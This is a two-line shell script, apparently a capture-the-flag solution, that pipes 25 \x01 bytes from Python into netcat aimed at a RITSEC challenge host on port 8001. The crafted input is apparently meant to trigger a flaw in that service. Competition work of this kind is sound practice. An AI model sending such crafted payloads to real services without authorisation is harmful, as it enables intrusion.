#!/bin/bash

python -c 'print("\x01" * 25)' | nc fun.ritsec.club 8001 
